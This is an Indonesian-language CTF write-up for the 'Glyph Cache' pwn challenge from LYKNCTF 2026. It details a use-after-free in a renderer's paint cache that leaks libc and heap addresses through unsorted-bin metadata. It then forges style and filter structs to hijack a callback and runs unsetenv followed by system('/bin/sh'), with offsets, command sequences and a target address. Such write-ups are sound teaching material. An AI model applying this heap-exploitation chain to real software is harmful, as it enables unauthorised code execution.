# Glyph Cache

**CTF:** LYKNCTF 2026  
**Category:** Pwn  
**Difficulty:** Medium  
**Target:** `15.235.202.47:9001`  
**Flag:** `LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}`

## Deskripsi

> I hope this easy enough for beginners to solve :D

Program mensimulasikan renderer kecil dengan cache untuk DOM, style, layout, dan paint. `optimize` dapat membebaskan arena style yang sudah retired tanpa membuang paint cache ketika hash layout tidak berubah. Paint cache akhirnya menyimpan pointer ke `ComputedStyle` yang sudah bebas.

UAF tersebut memberi dua hal sekaligus:

1. leak libc dan heap melalui `inspect paint raw`;
2. function pointer control setelah chunk direbut kembali lewat `profile add`.

## Recon

Isi arsip:

```text
public/chall
public/libc.so.6
public/ld-linux-x86-64.so.2
public/run.sh
```

Proteksi binary:

```text
Arch:       amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         Enabled
PIE:        Enabled
CET:        IBT, SHSTK
Stripped:   No
```

Program menyediakan command berikut:

```text
load <text>
style [name]
layout
paint
theme <name>
optimize
profile add <hex bytes>
inspect paint raw
render
epochs
reset
```

Simbol yang membantu analisis:

```text
0x6330  safe_filter(char const*)
0x6360  fill_style(ComputedStyle*, char const*)
0x63d0  rebuild_style(char*)
```

## Struktur Style dan Filter

`rebuild_style()` membuat satu arena dengan empat alokasi:

```c
malloc(0x430);  // style block A
malloc(0x20);
malloc(0x430);  // style block B
malloc(0x20);
```

Dua block berukuran `0x430` diisi sebagai `ComputedStyle`. Field yang dipakai saat render:

```text
ComputedStyle + 0x10 = filter pointer
```

`fill_style()` normalnya mengisi field tersebut dengan alamat filter aman global.

Filter mempunyai layout minimal:

```text
filter + 0x00 = 0x46494c4648505947  // bytes: "GYPHFLIF"
filter + 0x08 = callback(char const *)
```

Bagian penting dari `render`:

```c
style = paint_cache->style;
filter = style->filter;

if (filter == NULL || filter->magic != 0x46494c4648505947) {
    puts("[render] filter missing");
    return;
}

filter->callback(document.c_str());
```

Function pointer dipanggil dengan teks dari command `load` sebagai argumen pertama.

## Bug UAF pada Paint Cache

Urutan normal:

```text
load <document>
style one
layout
paint
```

`paint` menyimpan pointer ke style aktif ke dalam paint cache.

Saat menjalankan:

```text
style two
```

style lama menjadi retired dan style baru dibuat pada arena lain. Paint cache masih menunjuk style lama.

Kemudian:

```text
optimize
```

Jika hash layout belum berubah, program menampilkan:

```text
[optimize] paint cache kept: layout hash unchanged
```

Walaupun cache dipertahankan, dua block `0x430` milik arena retired tetap dipanggil `free()`. Pointer style di paint cache sekarang dangling.

## Leak Unsorted Bin dan Heap

Ukuran request `0x430` menghasilkan chunk glibc berukuran `0x440`, lebih besar dari batas tcache. Kedua chunk masuk ke unsorted bin.

Karena block A dibebaskan lebih dulu dan block B setelahnya, metadata pada user data block A menjadi:

```text
A + 0x00 = fd -> main_arena
A + 0x08 = bk -> header chunk B
```

Command berikut mencetak 0x50 byte dari pointer style stale:

```text
inspect paint raw
```

Contoh:

```text
[inspect] paint[0] node=1 text_len=15 raw=
203be0f0e47e000010170b281b560000...
```

Parsing leak:

```python
unsorted_fd = u64(raw[0:8])
chunk_b_header = u64(raw[8:16])

libc_base = unsorted_fd - 0x203b20
chunk_b_user = chunk_b_header + 0x10
```

Offset `0x203b20` berasal dari `libc.so.6` yang dibundel bersama challenge.

## Reclaim dengan `profile add`

Handler `profile add` menjalankan:

```c
page = calloc(1, 0x430);
decode_hex_into(page);
```

Ukuran request-nya sama dengan block style yang sudah bebas. Dua pemanggilan berturut-turut merebut kembali block A dan B.

Allocation pertama menimpa stale `ComputedStyle`:

```python
fake_style = bytearray(0x18)
fake_style[0x10:0x18] = p64(chunk_b_user)
```

Allocation kedua membuat filter palsu di block B:

```python
fake_filter = flat(
    0x46494C4648505947,
    callback,
)
```

Saat `render`, paint cache membaca block A sebagai style, mengambil pointer filter pada offset `+0x10`, memvalidasi magic block B, lalu memanggil callback yang kita tentukan.

## Kenapa Perlu Dua Stage

`run.sh` menjalankan binary dengan loader dan libc bundle:

```sh
export LD_LIBRARY_PATH="$DIR${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
exec "$DIR/ld-linux-x86-64.so.2" --library-path "$DIR" "$DIR/chall"
```

Memanggil `system("/bin/sh")` langsung dapat gagal. Shell eksternal mewarisi `LD_LIBRARY_PATH` dan mencoba memuat libc challenge, padahal executable `/bin/sh` berasal dari host.

Primitive callback menerima satu argumen string, jadi stage pertama dibuat sebagai:

```c
unsetenv("LD_LIBRARY_PATH");
```

Offset pada libc bundle:

```text
unsetenv = libc_base + 0x4ada0
```

Setelah environment bersih, UAF dibuat sekali lagi dengan document `/bin/sh`. Callback tahap kedua:

```c
system("/bin/sh");
```

Offset:

```text
system = libc_base + 0x58750
```

## Alur Exploit

Stage pertama:

```text
load LD_LIBRARY_PATH
style one
layout
paint
style two
optimize
inspect paint raw
profile add <fake style>
profile add <magic + unsetenv>
render
```

Stage kedua:

```text
load /bin/sh
layout
paint
style three
optimize
inspect paint raw
profile add <fake style>
profile add <magic + system>
render
```

## Menjalankan Solver

Remote:

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
```

Lokal dari folder hasil ekstrak:

```bash
python3 solve.py LOCAL
```

Validasi lokal:

```text
[+] libc base = 0x7f...
[+] LD_LIBRARY_PATH dihapus
[+] system('/bin/sh') dipanggil
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Flag

```text
LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}
```
